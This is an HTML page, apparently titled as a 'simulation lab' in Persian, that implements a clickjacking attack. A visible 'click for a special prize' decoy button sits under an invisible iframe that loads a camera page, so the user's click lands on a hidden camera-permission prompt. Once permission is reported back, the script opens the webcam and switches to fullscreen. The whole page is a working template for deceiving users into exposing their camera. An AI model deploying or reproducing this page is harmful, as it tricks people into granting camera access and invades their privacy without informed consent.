
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>آزمایشگاه شبیه‌سازی</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; background-color: #282c34; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; }
        #container { position: relative; width: 300px; height: 150px; }
        #decoy-button { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(45deg, #ff416c, #ff4b2b); border: none; border-radius: 15px; color: white; font-size: 24px; font-weight: bold; cursor: pointer; z-index: 1; display: flex; justify-content: center; align-items: center; box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
        #camera-frame { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; border: none; z-index: 2; }
        #live-camera { display: none; width: 100vw; height: 100vh; object-fit: cover; }
    </style>
</head>
<body>
    <div id="container">
        <div id="decoy-button">🎁 برای جایزه ویژه کلیک کنید! 🎁</div>
        <iframe id="camera-frame" src="./camera_frame.html"></iframe>
    </div>
    <video id="live-camera" autoplay></video>
    <script>
        const videoElement = document.getElementById('live-camera');
        const container = document.getElementById('container');
        window.addEventListener('message', function(event) {
            if (event.data === 'permission_granted') {
                container.style.display = 'none';
                videoElement.style.display = 'block';
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function(stream) {
                        videoElement.srcObject = stream;
                        document.documentElement.requestFullscreen();
                    }).catch(err => console.error("Error on main page:", err));
            }
        });
    </script>
</body>
</html>
